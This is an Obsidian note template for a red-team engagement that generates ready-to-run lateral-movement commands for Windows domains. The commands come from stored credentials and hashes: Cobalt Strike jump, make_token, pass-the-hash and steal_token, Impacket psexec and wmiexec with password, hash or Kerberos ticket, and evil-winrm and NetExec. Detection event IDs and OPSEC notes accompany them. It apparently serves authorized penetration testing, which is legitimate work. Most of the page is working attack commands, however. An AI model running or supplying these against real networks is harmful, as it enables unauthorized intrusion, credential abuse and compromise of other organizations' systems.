---
# Attack-specific fields
lateral_target_ip:
lateral_target_fqdn:
lateral_username:
lateral_method: psexec64
listener_name: http
notes:
---

# Lateral Movement

> [!abstract] Attack Summary
> Move from the current compromised host to other systems in the network using existing credentials or tokens. Techniques include PSExec (service-based), WMI (Windows Management Instrumentation), and WinRM (PowerShell remoting). Each has different OPSEC characteristics.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["NTLM Hash",b?.ntlm_hash ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const methods = ["psexec64","psexec","winrm64","wmi64","wmi","rdp"];
const methodOptions = methods.map(m => `option(${m})`).join(',');

dv.table(["Field", "Value"], [
  ["Target IP",         `\`INPUT[text(defaultValue("${p.lateral_target_ip || b?.target_ip || ''}")):lateral_target_ip]\``],
  ["Target FQDN",       `\`INPUT[text(defaultValue("${p.lateral_target_fqdn || b?.target_fqdn || ''}")):lateral_target_fqdn]\``],
  ["Username",          `\`INPUT[text(defaultValue("${p.lateral_username || b?.username || ''}")):lateral_username]\``],
  ["Movement Method",   `\`INPUT[inlineSelect(defaultValue(${p.lateral_method ?? 'psexec64'}),${methodOptions}):lateral_method]\``],
  ["C2 Listener",       `\`INPUT[text(defaultValue("${p.listener_name ?? 'http'}")):listener_name]\``],
]);
```

---

## Prerequisite — Impersonate Target User

> [!info] Before lateral movement, ensure you have the right identity. Use [[17 - Token Impersonation]] or [[15 - Pass the Ticket]].

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const shortDom = domain.split('.')[0].toUpperCase();
const username = p?.lateral_username || b?.username || "USER";
const ntlm     = b?.ntlm_hash || "NTLM_HASH";
const password = b?.password || "PASSWORD";
dv.paragraph("```bash\n# Option 1: Make token (if you have creds)\nmake_token " + shortDom + "\\" + username + " " + password + "\n\n# Option 2: Pass the hash (PtH)\npth " + shortDom + "\\" + username + " " + ntlm + "\n\n# Option 3: Steal token from running process\nps  # find PID\nsteal_token PID\n\n# Verify identity\ngetuid\n```");
```

---

## Method A — PSExec

> [!info] Uploads a service binary to ADMIN$, creates a service, executes as SYSTEM. Loud but reliable.

**Windows — Cobalt Strike jump psexec**
```dataviewjs
const p = dv.current();
const targetFqdn = p?.lateral_target_fqdn || "TARGET.domain.local";
const listener   = p?.listener_name || "http";
dv.paragraph("```bash\njump psexec64 " + targetFqdn + " " + listener + "\n\n# Or non-x64:\njump psexec " + targetFqdn + " " + listener + "\n```");
```

**Linux — Impacket psexec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const username = p?.lateral_username || b?.username || "USER";
const password = b?.password || "PASSWORD";
const ntlm     = b?.ntlm_hash || "NTLM_HASH";
const target   = p?.lateral_target_fqdn || "TARGET.domain.local";
dv.paragraph("```bash\n# With password\nimpacket-psexec " + domain + "/" + username + ":'" + password + "'@" + target + "\n\n# With hash\nimpacket-psexec " + domain + "/" + username + "@" + target + " -hashes :'" + ntlm + "'\n\n# With Kerberos\nexport KRB5CCNAME=ticket.ccache\nimpacket-psexec -k -no-pass " + domain + "/" + username + "@" + target + "\n```");
```

**Detection:** Event 4697 (service installed), file write to ADMIN$, binary execution.

---

## Method B — WMI

> [!info] Uses WMI to create a remote process. No service creation — quieter than PSExec.

**Windows — Cobalt Strike jump wmi**
```dataviewjs
const p = dv.current();
const targetFqdn = p?.lateral_target_fqdn || "TARGET.domain.local";
const listener   = p?.listener_name || "http";
dv.paragraph("```bash\njump wmi64 " + targetFqdn + " " + listener + "\n\n# Note: CoInitializeSecurity may block callbacks — use spawn/spawnas workaround\n```");
```

**Linux — Impacket wmiexec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const username = p?.lateral_username || b?.username || "USER";
const password = b?.password || "PASSWORD";
const ntlm     = b?.ntlm_hash || "NTLM_HASH";
const target   = p?.lateral_target_ip || b?.target_ip || "TARGET_IP";
dv.paragraph("```bash\n# With password\nimpacket-wmiexec " + domain + "/" + username + ":'" + password + "'@" + target + "\n\n# With hash\nimpacket-wmiexec " + domain + "/" + username + "@" + target + " -hashes :'" + ntlm + "'\n\n# NetExec WMI\nnxc wmi " + target + " -u '" + username + "' -p '" + password + "' -d " + domain + " -x 'whoami'\n```");
```

**Detection:** WmiPrvSE.exe as parent process, Event 4688 (process creation via WMI).

---

## Method C — WinRM (PowerShell Remoting)

> [!info] Uses WinRM/PowerShell remoting. Target must have WinRM enabled (port 5985/5986).

**Windows — Cobalt Strike jump winrm**
```dataviewjs
const p = dv.current();
const targetFqdn = p?.lateral_target_fqdn || "TARGET.domain.local";
const listener   = p?.listener_name || "http";
dv.paragraph("```bash\njump winrm64 " + targetFqdn + " " + listener + "\n```");
```

**Linux — Evil-WinRM**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const username = p?.lateral_username || b?.username || "USER";
const password = b?.password || "PASSWORD";
const ntlm     = b?.ntlm_hash || "NTLM_HASH";
const target   = p?.lateral_target_ip || b?.target_ip || "TARGET_IP";
dv.paragraph("```bash\n# With password\nevil-winrm -i " + target + " -u '" + username + "' -p '" + password + "'\n\n# With hash\nevil-winrm -i " + target + " -u '" + username + "' -H '" + ntlm + "'\n\n# NetExec\nnxc winrm " + target + " -u '" + username + "' -p '" + password + "' -x 'whoami'\n```");
```

**Detection:** wsmprovhost.exe spawned, PowerShell block logging (Event 4103/4104).

---

## Method D — Remote Command via Beacon remote-exec

**Windows — Cobalt Strike remote-exec**
```dataviewjs
const p = dv.current();
const targetFqdn = p?.lateral_target_fqdn || "TARGET.domain.local";
dv.paragraph("```bash\n# Run command on remote host without spawning a Beacon\nremote-exec wmi " + targetFqdn + " whoami\nremote-exec winrm " + targetFqdn + " whoami\nremote-exec psexec " + targetFqdn + " whoami\n```");
```

---

## Comparison Table

| Method | Runs as | Port(s) | OPSEC | Service Event |
|---|---|---|---|---|
| PSExec | SYSTEM | 445 (SMB) | Noisy | Yes (4697) |
| WMI | Current user | 135 + dynamic | Medium | No |
| WinRM | Current user | 5985/5986 | Quiet | No |
| SCM | SYSTEM | 445 | Noisy | Yes |

---

## OPSEC

> [!warning] Detection Indicators
> - PSExec: **Event 4697** (service installed), ADMIN$ write, sc.exe usage.
> - WMI: **WmiPrvSE.exe** process ancestry, **Event 4688**, unusual process parent.
> - WinRM: **wsmprovhost.exe** as parent, PowerShell logging **4103/4104**.
> - All: **Event 4624** (logon) and **Event 4634** (logoff) for network logons.

---

## Notes & Results

`INPUT[textarea:notes]`
